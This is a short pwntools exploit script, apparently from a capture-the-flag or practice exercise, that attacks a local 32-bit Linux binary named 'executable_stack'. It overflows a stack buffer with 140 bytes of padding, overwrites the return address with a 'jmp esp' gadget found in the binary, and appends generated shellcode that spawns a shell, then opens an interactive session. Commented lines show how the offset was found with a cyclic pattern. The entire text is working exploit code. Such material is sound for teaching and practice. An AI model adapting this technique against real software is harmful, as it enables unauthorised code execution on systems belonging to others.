from pwn import *

# classic buffer overflow with executable stack. overwrite instruction pointer and return to stack esp

context.update(arch='i386', os='linux')
io = process("./executable_stack")

# gdb.attach(io, 'continue')
# pattern = cyclic(512)
# io.sendline(pattern)
# pause()
# sys.exit()

binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])
io.sendline(exploit)
io.interactive()